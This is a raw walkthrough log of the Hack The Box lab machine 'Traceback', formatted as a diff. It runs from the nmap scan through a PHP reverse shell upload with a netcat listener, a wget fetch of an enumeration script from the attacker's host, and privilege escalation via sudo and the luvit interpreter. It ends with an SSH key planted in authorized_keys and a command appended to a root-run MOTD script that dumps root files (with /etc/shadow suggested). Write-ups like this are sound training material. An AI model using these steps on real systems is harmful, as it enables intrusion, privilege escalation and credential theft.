@@ -1,0 +1,251 @@
+Traceback
+
+
+
+root@kali:~# nmap -A -T4 -p- 10.10.10.181
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 22:36 EDT
+Nmap scan report for 10.10.10.181
+Host is up (0.25s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Help us
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/5%OT=22%CT=1%CU=43626%PV=Y%DS=2%DC=T%G=Y%TM=5E8A9982
+OS:%P=i686-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1
+OS:=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW
+OS:7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=
+OS:Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R
+OS:D=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%
+OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
+OS:O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=4
+OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 199/tcp)
+HOP RTT       ADDRESS
+1   362.01 ms 10.10.14.1
+2   362.01 ms 10.10.10.181
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 997.37 seconds
+
+
+// less of information, tried to scan dirb  ,fuzz, and  burpsuit, but with no luck
+
+// check the main page, and go to in inspection check source code, found “ some of the best web shells that you might need “
+
+// then , do google search, found  this https://github.com/TheBinitGhimire/Web-Shells  that related with author.
+
+// test on the web page for these shells one by one.  
+
+// got  https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php   is working 
+
+// use admin / admin to login and upload php code payload. 
+
+// use this payload : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+root@kali:~# nc -lvp 9422
+listening on [any] 9422 ...
+10.10.10.181: inverse host lookup failed: Unknown host
+connect to [10.10.14.54] from (UNKNOWN) [10.10.10.181] 38338
+Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 01:28:00 up 23 min,  3 users,  load average: 0.28, 0.14, 0.10
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+webadmin pts/2    10.10.14.26      01:08    2:24   0.25s  0.00s sshd: webadmin [priv]
+webadmin pts/4    10.10.14.211     01:16   36.00s  0.11s  0.11s -bash
+webadmin pts/8    10.10.14.26      01:25    2:18   0.03s  0.03s -bash
+uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+$ 
+$ pwd
+/
+$ whoami
+webadmin
+
+root@kali:/tmp# vim lm.sh 
+root@kali:/tmp# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.181 - - [06/Apr/2020 08:06:44] "GET /lm.sh HTTP/1.1" 200 -
+
+$ ls -la
+total 8
+drwxrwxrwt  2 root     root     4096 Apr  6 05:08 .
+drwxr-xr-x 22 root     root     4096 Aug 25  2019 ..
+prw-r--r--  1 webadmin webadmin    0 Apr  6 05:08 f
+$ wget http://10.10.14.54/lm.sh
+--2020-04-06 05:09:16--  http://10.10.14.54/lm.sh
+Connecting to 10.10.14.54:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'lm.sh'
+
+     0K .......... .......... .......... .......... .....     100% 55.6K=0.8s
+
+2020-04-06 05:09:17 (55.6 KB/s) - 'lm.sh' saved [46631/46631]
+
+$ ls -la
+total 56
+drwxrwxrwt  2 root     root      4096 Apr  6 05:09 .
+drwxr-xr-x 22 root     root      4096 Aug 25  2019 ..
+prw-r--r--  1 webadmin webadmin     0 Apr  6 05:09 f
+-rw-rw-rw-  1 webadmin webadmin 46631 Apr  6 05:05 lm.sh
+$ bash lm.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/webadmin/.bash_history
+ls -la
+sudo -l
+nano privesc.lua
+sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+rm privesc.lua
+logout
+clear
+ls
+sudo -l
+sudo -u sysadmin /home/sysadmin/luvit -e os.execute("/bin/sh")
+sudo -u sysadmin /home/sysadmin/luvit -e os.execute('/bin/sh')
+sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/sh')"
+
+
+$  sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/sh’)”   // found this shell can be pri esc
+sh: turning off NDELAY mode
+pwd
+/tmp
+whoami
+sysadmin
+cat /home/sysadmin/user.txt
+
+bash -i \     // into the tty
+
+bash: cannot set terminal process group (640): Inappropriate ioctl for device
+bash: no job control in this shell
+sysadmin@traceback:/$ 
+
+// run LinEnum.sh again. 
+// -] SUID files:   -rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+// checked everything, but need to check pspy64 
+https://github.com/DominicBreuker/pspy
+
+sysadmin@traceback:/$ cd /home/sysadmin
+cd /home/sysadmin
+sysadmin@traceback:~$ ls -la
+ls -la
+total 8748
+drwxr-x--- 5 sysadmin sysadmin    4096 Apr  6 15:17 .
+drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..
+-rw------- 1 sysadmin sysadmin      98 Apr  6 15:39 .bash_history
+-rw-r--r-- 1 sysadmin sysadmin     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 sysadmin sysadmin    3771 Apr  4  2018 .bashrc
+drwx------ 2 sysadmin sysadmin    4096 Aug 25  2019 .cache
+drwxrwxr-x 3 sysadmin sysadmin    4096 Aug 24  2019 .local
+-rw-r--r-- 1 sysadmin sysadmin     807 Apr  4  2018 .profile
+drwxr-xr-x 2 root     root        4096 Aug 25  2019 .ssh
+-rwxr-xr-x 1 sysadmin sysadmin   42151 May 22  2018 linEnum.sh
+-rwxrwxr-x 1 sysadmin sysadmin 4397566 Aug 24  2019 luvit
+-rwxrwxr-x 1 sysadmin sysadmin 4468984 Apr  4 14:22 pspy64
+-rw------- 1 sysadmin sysadmin      33 Apr  6 14:49 user.txt
+
+sysadmin@traceback:~$ ./pspy64
+
+2020/04/06 16:01:05 CMD: UID=0    PID=16     | 
+2020/04/06 16:01:05 CMD: UID=1000 PID=1583   | /bin/sh -i 
+2020/04/06 16:01:05 CMD: UID=1000 PID=1579   | sh -c uname -a; w; id; /bin/sh -i 
+2020/04/06 16:01:05 CMD: UID=1000 PID=1553   | vi priv.lua 
+2020/04/06 16:01:05 CMD: UID=1000 PID=1549   | /bin/sh -i 
+2020/04/06 16:01:05 CMD: UID=1000 PID=1545   | sh -c uname -a; w; id; /bin/sh -i 
+2020/04/06 16:01:05 CMD: UID=0    PID=15     | 
+2020/04/06 16:01:05 CMD: UID=1000 PID=1490   | /usr/sbin/apache2 -k start 
+2020/04/06 16:01:05 CMD: UID=1000 PID=1404   | /usr/sbin/apache2 -k start 
+2020/04/06 16:01:05 CMD: UID=0    PID=14     | 
+2020/04/06 16:07:29 CMD: UID=0    PID=1      | /sbin/init noprompt 
+2020/04/06 16:07:31 CMD: UID=0    PID=8567   | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ 
+2020/04/06 16:07:31 CMD: UID=1001 PID=8568   | bash 
+2020/04/06 16:07:31 CMD: UID=???  PID=8569   | ???
+2020/04/06 16:07:31 CMD: UID=1001 PID=8573   | /bin/sh /usr/bin/lesspipe 
+2020/04/06 16:07:31 CMD: UID=1001 PID=8572   | /bin/sh /usr/bin/lesspipe 
+2020/04/06 16:07:31 CMD: UID=1001 PID=8571   | bash 
+
+2020/04/06 16:09:31 CMD: UID=0    PID=8793   | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ 
+2020/04/06 16:10:01 CMD: UID=???  PID=8800   | ???
+2020/04/06 16:10:01 CMD: UID=0    PID=8799   | sleep 30 
+2020/04/06 16:10:01 CMD: UID=???  PID=8798   | ???
+2020/04/06 16:10:01 CMD: UID=0    PID=8797   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
+2020/04/06 16:10:01 CMD: UID=0    PID=8796   | /usr/sbin/CRON -f 
+2020/04/06 16:10:01 CMD: UID=0    PID=8795   | /usr/sbin/CRON -f 
+
+
+// detected there is a routing job running 30s circle.  We need to update welcome information under /etc/update-motd.d
+
+// insert cat /root/root.txt under 00-header that allows WebAdmin to show the welcome information upon login
+
+// for login WebAdmin, set up ssh-key for no pass login
+
+$ cat authorized_keys
+$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/webadmin/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/webadmin/.ssh/id_rsa.
+Your public key has been saved in /home/webadmin/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:nGBPY0GcmhuAA2tL70BbMJTKQDPnTNvXd+wK2zoidFo webadmin@traceback
+The key's randomart image is:
++---[RSA 2048]----+
+|+O.+   oo.       |
+|.o% +   +.  .    |
+|=+ * oo++. . o   |
+|=.=  .=* o. o    |
+| + .   oS.   .   |
+|  o  ..E  + .    |
+|   .. +  . o     |
+|     o . ..      |
+|      . ...      |
++----[SHA256]-----+
+$ ls -la
+total 24
+drwxrwxr-x 2 webadmin webadmin 4096 Apr  6 18:23 .
+drwxr-x--- 5 webadmin sysadmin 4096 Apr  6 17:40 ..
+-rw-rw-rw- 1 webadmin webadmin 1128 Apr  6 18:20 auth
+-rw------- 1 webadmin webadmin 1128 Apr  6 18:23 authorized_keys
+-rw------- 1 webadmin webadmin 1679 Apr  6 18:23 id_rsa
+-rw-r--r-- 1 webadmin webadmin  400 Apr  6 18:23 id_rsa.pub
+$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4Adn6XFIuuJJeMMZxRwLlj2odDo72JBwASpyRaBDsgTwhOgJy/AahIRJIqTzQFIE3Prye0Yt54ZvXuYbk2hfywGaQWF/st9UkPNDVAaZPimthSm9B6me43kLtNaFhvXNc/l+jjNOTKOuKi0h/ql56xfBeABNRUqOj/omRR5sHPTH0IKqhJ2/zZx2RkmpXBn9lHInI2LqyEKgdLyXn0/riayr5fB4UegkldhvfLtRJR1exSljTP3qySlkQU0hjwlrtiO11bu3NEUj7m61osBilzkQpI8Y27Vs4JkgE8xBPqQA/+kTuAQMzckdMv768VyH6C9c8FMqPKT+kfOYmicIz webadmin@traceback
+$ cat id_rsa.pub >> authorized_keys
+
+sysadmin@traceback:/tmp$ echo "cat /root/root.txt" >> 00-header        // try?  echo "cat /etc/shadow” >> 00-header 
+sysadmin@traceback:/tmp$ cp 00-header /etc/update-motd.d/ -rf
+
+root@kali:~# ssh -i webadmin.key webadmin@10.10.10.181
+#################################
+-------- OWNED BY XH4H  ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+
+Welcome to Xh4H land 
+
+9bdeedxxxxxxxxxx39358692
+
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Mon Apr  6 18:38:36 2020 from 10.10.14.54
